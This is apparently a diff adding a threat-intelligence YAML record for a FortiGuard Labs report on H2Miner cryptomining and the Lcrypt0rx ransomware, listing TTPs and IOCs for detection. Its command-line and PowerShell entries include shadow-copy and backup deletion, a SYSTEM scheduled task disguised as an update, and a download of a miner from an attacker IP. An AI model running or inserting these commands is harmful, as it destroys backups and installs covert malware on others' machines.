@@ -1,0 +1,67 @@
+description: FortiGuard Labs investigated a cluster of VPS used for Monero mining
+  associated with prior H2miner campaigns and identified a new variant of the Lcryx
+  ransomware, called Lcrypt0rx.
+attribution: H2Miner/Lcrypt0rx
+malware_families:
+- H2Miner
+- Lcrypt0rx
+- Kinsing
+TTPs:
+  processes:
+  - wscript.exe
+  - cmd.exe
+  - schtasks.exe
+  - taskmgr.exe
+  - msconfig.exe
+  - regedit.exe
+  - powershell.exe
+  commandline:
+  - wscript.exe //elevated
+  - cmd.exe /c vssadmin delete shadows /all /quiet
+  - cmd.exe /c wbadmin delete catalog -quiet
+  - schtasks.exe /create /tn "Update service for Windows Service" /tr "C:\Windows\Temp\sysupdate.exe"
+    /sc minute /ru SYSTEM
+  - powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\sysupdate.ps1
+  powershell:
+  - Invoke-WebRequest -Uri "http://78.153.140.66/xmr" -OutFile "$env:TEMP\sysupdate.exe"
+  - New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+  - Register-ScheduledTask -TaskName "Update service for Windows Service" -Trigger
+    $trigger -Action $action -Description "Monero Miner"
+  registry_keys:
+  - HKCU\\Control Panel\\Desktop\\Wallpaper
+  - HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMDL
+  - Winlogon Shell
+  - Image File Execution Options (IFEO) debugger for cmd.exe
+  network_connections:
+  - 78.153.140.66
+  - s10.krakenfiles.com
+  file_activity:
+  - C:\Windows\Temp\sysupdate.exe
+  - C:\Windows\Temp\sysupdate.ps1
+  - ff1706b37fea16d75b739a5396d9ffba
+  - image.jpg
+  persistence:
+  - 'Scheduled Task: Update service for Windows Service'
+  - Winlogon Shell Registry Key Modification
+  - Image File Execution Options (IFEO) debugger for cmd.exe
+  - Run Keys
+  pipes: []
+  process_relations: []
+IOCs:
+- 78.153.140.66
+- s10.krakenfiles.com
+- 80.64.16.241
+- 89.208.104.175
+- 47.97.113.36
+- 176.65.137.203
+- 185.156.72.96
+- 80.64.18.16
+- 207.231.109.252
+- 104.21.32.1
+- ff1706b37fea16d75b739a5396d9ffba
+- 4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC
+authors:
+- Akshat Pradhan
+reference: https://www.fortinet.com/blog/threat-research/old-miner-new-tricks
+date_of_publication: July 16, 2025
+file_creation_date: July 18, 2025
